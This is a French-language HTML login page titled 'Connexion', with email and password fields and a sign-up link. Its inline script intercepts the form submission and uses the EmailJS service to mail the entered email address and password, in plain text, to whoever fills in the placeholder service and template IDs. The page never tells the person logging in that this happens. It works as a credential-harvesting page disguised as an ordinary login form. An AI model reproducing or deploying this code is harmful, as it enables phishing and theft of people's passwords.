<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Page de Connexion</title>
</head>
<body>
    <div class="container">
        <h2>Connexion</h2>
        <form id="loginForm">
            <label for="email">Adresse email :</label>
            <input type="text" id="email" name="email" required>
            <label for="password">Mot de passe :</label>
            <input type="password" id="password" name="password" required>
            <input type="submit" value="Se connecter">
        </form>
        <p>Pas de compte ? <a href="/page-inscription">Créer un compte</a></p>
    </div>

    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script src="LoginForm.js"></script>

    <script>
        (function(){
            emailjs.init("YOUR_USER_ID"); // Remplacez YOUR_USER_ID par votre identifiant EmailJS
            document.getElementById('loginForm').addEventListener('submit', function(event) {
                event.preventDefault();
                // Récupérer les valeurs du formulaire
                const email = document.getElementById('email').value;
                const password = document.getElementById('password').value;

                // Envoyer les informations par email
                emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
                    email: email,
                    password: password
                }).then(function(response) {
                    console.log('Email envoyé avec succès!', response);
                    // Ici vous pouvez rediriger l'utilisateur ou afficher un message de confirmation
                }, function(error) {
                    console.error('Erreur lors de l\'envoi de l\'email:', error);
                });
            });
        })();
    </script>
</body>
</html>
